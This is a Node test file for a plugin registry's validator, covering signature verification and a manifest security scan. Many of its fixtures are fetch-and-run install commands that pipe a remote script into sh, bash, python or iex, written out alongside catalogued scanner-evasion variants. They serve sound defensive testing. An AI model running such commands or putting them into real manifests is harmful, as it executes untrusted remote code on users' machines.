#!/usr/bin/env node
// validate.test.mjs — self-tests for the registry validator's security-critical
// pure helpers. Zero dependencies: uses the built-in node:test runner + node:assert.
//
//   node --test scripts/validate.test.mjs
//
// These lock in the behaviour of the manifest security scan, ed25519 signature
// verification, key-id derivation, and the publisher/slug identity rules — and,
// importantly, DOCUMENT the known scan-evasion gaps so a future change that
// narrows them turns the "KNOWN GAP" assertions red (a deliberate tripwire).

import test from "node:test";
import assert from "node:assert/strict";
import { generateKeyPairSync, sign as edSign, createHash } from "node:crypto";

import {
  keyID,
  signedPayload,
  verifySignature,
  scanManifest,
  VALID_PUBLISHER,
  VALID_SLUG,
  CHANNELS,
} from "./validate.mjs";

// --- helpers ----------------------------------------------------------------

function newKey() {
  const { publicKey, privateKey } = generateKeyPairSync("ed25519");
  const pubRaw = Buffer.from(publicKey.export({ format: "jwk" }).x, "base64url");
  return { privateKey, pubB64: pubRaw.toString("base64") };
}
const highFields = (m) => scanManifest(m).filter((f) => f.severity === "high").map((f) => f.field);
const hasHigh = (m) => scanManifest(m).some((f) => f.severity === "high");

// --- key id -----------------------------------------------------------------

test("keyID = sha256(rawpub)[:16] and matches a 32-byte key", () => {
  const { pubB64 } = newKey();
  const raw = Buffer.from(pubB64, "base64");
  const expected = createHash("sha256").update(raw).digest("hex").slice(0, 16);
  assert.equal(keyID(pubB64), expected);
  assert.equal(keyID(pubB64).length, 16);
});

test("keyID rejects a non-32-byte key", () => {
  assert.equal(keyID(Buffer.alloc(31).toString("base64")), "");
  assert.equal(keyID(Buffer.alloc(33).toString("base64")), "");
  assert.equal(keyID(""), "");
});

// --- signature verification -------------------------------------------------

test("verifySignature accepts a valid ed25519 release-identity signature", () => {
  const { privateKey, pubB64 } = newKey();
  const payload = signedPayload("hello-tool", "1.0.0", "https://x/y.tar.gz");
  const sig = edSign(null, payload, privateKey).toString("base64");
  assert.equal(verifySignature(payload, sig, pubB64), true);
});

test("verifySignature rejects a signature over a tampered artifact_url", () => {
  const { privateKey, pubB64 } = newKey();
  const signed = signedPayload("hello-tool", "1.0.0", "https://good/y.tar.gz");
  const sig = edSign(null, signed, privateKey).toString("base64");
  const tampered = signedPayload("hello-tool", "1.0.0", "https://evil/y.tar.gz");
  assert.equal(verifySignature(tampered, sig, pubB64), false);
});

test("verifySignature rejects a signature from a different key (no forgery)", () => {
  const a = newKey();
  const b = newKey();
  const payload = signedPayload("hello-tool", "1.0.0", "https://x/y.tar.gz");
  const sig = edSign(null, payload, a.privateKey).toString("base64");
  assert.equal(verifySignature(payload, sig, b.pubB64), false);
});

test("verifySignature rejects malformed signature / key", () => {
  const { pubB64 } = newKey();
  const payload = signedPayload("s", "1", "u");
  assert.equal(verifySignature(payload, "not-a-sig", pubB64), false);
  assert.equal(verifySignature(payload, Buffer.alloc(64).toString("base64"), "short"), false);
});

test("signedPayload is exactly slug\\0version\\0artifact_url", () => {
  assert.deepEqual(signedPayload("a", "b", "c"), Buffer.from("a\x00b\x00c", "utf8"));
});

// --- identity rules ---------------------------------------------------------

test("VALID_PUBLISHER mirrors core publisherRE", () => {
  for (const ok of ["acme", "a1", "my-co", "a".repeat(39)]) assert.ok(VALID_PUBLISHER.test(ok), ok);
  for (const bad of ["", "A", "-x", "x".repeat(40), "x_y", "foo.bar", "-"]) assert.ok(!VALID_PUBLISHER.test(bad), bad);
});

test("VALID_SLUG mirrors core slugRE (allows a 1-char slug)", () => {
  for (const ok of ["x", "hello-tool", "a1", "a".repeat(39)]) assert.ok(VALID_SLUG.test(ok), ok);
  for (const bad of ["", "Hello", "foo.bar", "foo_bar", "-x", "x".repeat(40), ".."]) assert.ok(!VALID_SLUG.test(bad), bad);
});

test("CHANNELS = {stable, beta}", () => {
  assert.ok(CHANNELS.has("stable") && CHANNELS.has("beta"));
  assert.ok(!CHANNELS.has("dev") && !CHANNELS.has(""));
});

// --- security scan: it MUST flag the obvious supply-chain footguns ----------

test("scan flags curl|sh pipe-to-shell installers (high)", () => {
  for (const step of ["curl http://e/x.sh | sh", "wget -qO- http://e/x|bash", "curl http://e/x | bash"]) {
    assert.ok(hasHigh({ host_native: { install: [step] } }), step);
  }
});

test("scan flags wildcard (*) egress (high)", () => {
  assert.deepEqual(highFields({ openapi: { allowed_hosts: ["*"] } }), ["openapi.allowed_hosts"]);
});

test("scan flags unmarked credential-looking config fields (high)", () => {
  for (const key of ["api_token", "client_secret", "user_password", "MY_APIKEY", "private_key"]) {
    assert.ok(hasHigh({ config: [{ key }] }), key);
  }
});

test("scan passes a clean, least-privilege manifest", () => {
  assert.equal(hasHigh({
    openapi: { allowed_hosts: ["api.acme.example.com"] },
    config: [{ key: "api_token", secret: true }],
    host_native: {},
  }), false);
});

test("scan: exec_start network fetch is a warn, not a hard fail", () => {
  const findings = scanManifest({ host_native: { exec_start: "curl http://e/x -o b && ./b" } });
  assert.ok(findings.some((f) => f.severity === "warn" && f.field === "host_native.exec_start"));
  assert.equal(findings.some((f) => f.severity === "high"), false);
});

// --- HARDENED: evasions the OLD scan missed are now CAUGHT -------------------
// The audit (PR #5) documented these as KNOWN-GAP tripwires. The scan now
// mirrors core's hardened ScanManifest (internal/marketplace/scan.go, PR #28),
// so each former bypass is ASSERTED-CAUGHT. Grouped by evasion class.

// Evasion class A: broad downloaders/interpreters (not just curl/wget).
test("HARDENED: non-curl/wget downloader + interpreter is caught (high)", () => {
  for (const step of [
    "aria2c http://e/x.sh -o /t/x && python -c \"import os;os.system(open('/t/x').read())\"",
    "fetch http://e/x.py | python",
    "wget -qO- http://e/x; perl -e 'system(...)'", // downloader + inline-exec, no pipe
    "socat - tcp:e:1 | sh",
    "lwp-download http://e/x.pl | perl",
  ]) {
    assert.ok(hasHigh({ host_native: { install: [step] } }), step);
  }
});

test("HARDENED: powershell download cradle is caught (high)", () => {
  for (const step of [
    "powershell -Command \"Invoke-WebRequest http://e/x.ps1 -OutFile x\"",
    "iwr http://e/x | iex",
  ]) {
    assert.ok(hasHigh({ host_native: { install: [step] } }), step);
  }
});

// Evasion class B: odd-whitespace / pipe-to-interpreter forms.
test("HARDENED: odd-whitespace pipe-to-shell is caught (high)", () => {
  for (const step of [
    "curl http://e/x.sh |  sh",      // double space
    "curl http://e/x.sh |\tsh",      // tab
    "curl http://e/x | python",      // pipe to interpreter
    "wget -qO- http://e/x | sudo bash",
    "curl http://e/x | /bin/sh",     // absolute interpreter path
  ]) {
    assert.ok(hasHigh({ host_native: { install: [step] } }), step);
  }
});

// Evasion class C: inline download-then-exec (no literal pipe).
test("HARDENED: download-then-inline-exec is caught (high)", () => {
  assert.ok(hasHigh({ host_native: { install: [
    "python -c \"import urllib.request,os; os.system(urllib.request.urlopen('http://e/x').read())\"",
  ] } }));
});

// Evasion class D: wildcard-PREFIX egress (not just bare '*').
test("HARDENED: wildcard-prefix egress is caught (high)", () => {
  for (const hosts of [["*.evil.example"], ["*evil.example"], ["*"]]) {
    assert.deepEqual(highFields({ openapi: { allowed_hosts: hosts } }), ["openapi.allowed_hosts"], JSON.stringify(hosts));
  }
});

// Evasion class E: pipe-to-shell in exec_start is now a HARD fail, not a warn.
test("HARDENED: pipe-to-shell in exec_start is a HIGH (not a warn)", () => {
  const findings = scanManifest({ host_native: { exec_start: "curl http://e/run.sh | sh" } });
  assert.ok(findings.some((f) => f.severity === "high" && f.field === "host_native.exec_start"));
});

// Evasion class F: broader credential-hint list (credential/pat/apikey/...).
test("HARDENED: broader credential-hint list is caught (high)", () => {
  for (const key of ["auth_credential", "pat", "my_pat", "bearer", "access_key", "signing_key", "refresh_token"]) {
    assert.ok(hasHigh({ config: [{ key }] }), key);
  }
});

// And the short-token whole-word boundary must NOT over-flag benign keys.
test("HARDENED: short cred tokens do not false-positive on benign keys", () => {
  for (const key of ["path", "pattern", "compatible_mode", "keyboard_layout", "author_name"]) {
    assert.equal(hasHigh({ config: [{ key }] }), false, key);
  }
});

// ---------------------------------------------------------------------------
// Re-audit blind spots (parity harness): 3 evasions BOTH engines must catch.
// Mirrors core's TestScanManifest additions (internal/marketplace/scan.go).
// ---------------------------------------------------------------------------

// Blind spot #1: pipe-to-shell via `env` invoking a shell (space before the
// interpreter, no slash-prefix on the shell name).
test("RE-AUDIT #1: pipe to `env <shell>` is caught (high)", () => {
  for (const step of [
    "curl -s http://e/i | /usr/bin/env bash",
    "wget -qO- http://e/i | env sh",
    "curl http://e/i.py | env -S python3",
    "curl http://e/i | env VAR=v bash",
  ]) {
    assert.ok(hasHigh({ host_native: { install: [step] } }), step);
  }
  // exec_start form is a HARD fail too.
  const findings = scanManifest({ host_native: { exec_start: "curl http://e/run | env bash" } });
  assert.ok(findings.some((f) => f.severity === "high" && f.field === "host_native.exec_start"));
});

// Benign guard: an `env`-prefixed binary launch WITHOUT a pipe must stay clean.
test("RE-AUDIT #1: env-prefixed exec without a pipe is clean", () => {
  assert.equal(hasHigh({ host_native: { exec_start: "/usr/bin/env node dist/main.js" } }), false);
});

// Blind spot #2: suffix / embedded wildcard egress (`evil*`, `e*il.com`).
test("RE-AUDIT #2: suffix/embedded wildcard egress is caught (high)", () => {
  for (const hosts of [["evil*"], ["e*il.com"], ["evil*.com"]]) {
    assert.deepEqual(highFields({ openapi: { allowed_hosts: hosts } }), ["openapi.allowed_hosts"], JSON.stringify(hosts));
  }
});

// Benign guard: exact (non-wildcard) hosts must stay clean.
test("RE-AUDIT #2: exact hosts are not flagged", () => {
  assert.equal(hasHigh({ openapi: { allowed_hosts: ["api.example.com", "cdn.example.com"] } }), false);
});

// Blind spot #3: `passphrase` / `passwd` whole-word credential hints.
test("RE-AUDIT #3: passphrase/passwd credential hints are caught (high)", () => {
  for (const key of ["vault_passphrase", "passphrase", "db_passwd", "passwd"]) {
    assert.ok(hasHigh({ config: [{ key }] }), key);
  }
});

// Benign guard: `path`/`pattern` must NOT trip the new cred hints.
test("RE-AUDIT #3: path/pattern stay clean", () => {
  for (const key of ["file_path", "match_pattern", "retry_pattern"]) {
    assert.equal(hasHigh({ config: [{ key }] }), false, key);
  }
});
